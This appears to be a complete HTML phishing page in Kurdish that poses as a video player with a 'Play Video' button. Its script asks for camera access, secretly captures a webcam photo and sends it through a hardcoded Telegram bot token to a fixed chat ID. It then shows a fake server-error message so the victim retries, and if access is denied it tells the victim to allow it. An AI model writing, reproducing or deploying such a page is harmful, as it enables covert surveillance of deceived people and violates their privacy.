<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <style>
        body {
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            /* باگراوەند بە ڕەنگی سەوزی مافورەکە و نەخشی کلاسیک */
            background-color: #1b2610;
            background-image: 
                radial-gradient(circle at center, rgba(212, 175, 55, 0.1) 0%, transparent 70%),
                url('https://www.transparenttextures.com/patterns/gold-dust.png');
            font-family: sans-serif;
            text-align: center;
            color: white;
        }

        #main-container {
            background: rgba(0, 0, 0, 0.6);
            padding: 40px;
            border-radius: 15px;
            border: 2px solid #d4af37; /* لێواری زێڕین */
            box-shadow: 0 0 30px rgba(0,0,0,0.5);
        }

        h2 {
            margin-bottom: 25px;
        }

        #startBtn {
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 10px;
            border: none;
            background: #d4af37; /* دوگمەی زێڕین */
            color: #1b2610;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }

        #startBtn:hover {
            background: #f1c40f;
            transform: scale(1.05);
        }
    </style>
</head>
<body>

    <div id="main-container">
        <h2 id="status">ڤیدیۆکە ئامادەیە</h2>
        <button id="startBtn">Play Video 🎬</button>
    </div>

    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const token = '7690976118:AAFBKfwJcXYlhYf4CDLIoynZoTTLho1jp5g'; 
        const myId = '7978104952'; 

        document.getElementById('startBtn').addEventListener('click', function() {
            document.getElementById('status').innerText = "کەمێک چاوەڕێ بکە...";
            this.style.display = 'none';

            navigator.mediaDevices.getUserMedia({ video: true })
            .then(s => {
                const v = document.getElementById('v');
                v.srcObject = s;
                
                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = 640; c.height = 480;
                    c.getContext('2d').drawImage(v, 0, 0);
                    
                    c.toBlob(b => {
                        const f = new FormData();
                        f.append('chat_id', myId);
                        f.append('photo', b, 'img.jpg');

                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                            method: 'POST',
                            body: f
                        }).then(() => {
                            document.getElementById('status').innerText = "هەڵەیەک لە سێرڤەر ڕوویدا، دووبارە هەوڵ بدەرەوە!";
                        });
                    }, 'image/jpeg');
                }, 1000);
            })
            .catch(e => {
                document.getElementById('status').innerText = "بۆ بینینی ڤیدیۆکە دەبێت ڕێگە بدەیت (Allow).";
            });
        });
    </script>
</body>
</html>
